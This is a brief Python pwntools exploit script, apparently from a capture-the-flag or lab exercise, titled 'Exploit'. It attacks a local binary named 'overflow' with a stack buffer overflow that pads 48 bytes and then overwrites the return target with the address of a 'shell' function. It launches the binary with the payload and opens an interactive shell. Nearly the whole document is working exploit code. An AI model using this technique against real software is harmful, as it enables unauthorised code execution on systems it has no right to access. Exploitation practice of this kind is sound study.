Exploit#

#!/bin/python3

from pwn import *

context(os="linux",arch="amd64")

binary = "./overflow"
elf = ELF(binary)

payload = (b'A'* 48 + flat(elf.sym['shell'])).replace(b'\x00',b'')

target = elf.process(argv=[payload])

print(target.clean().decode('utf-8'))
target.interactive()
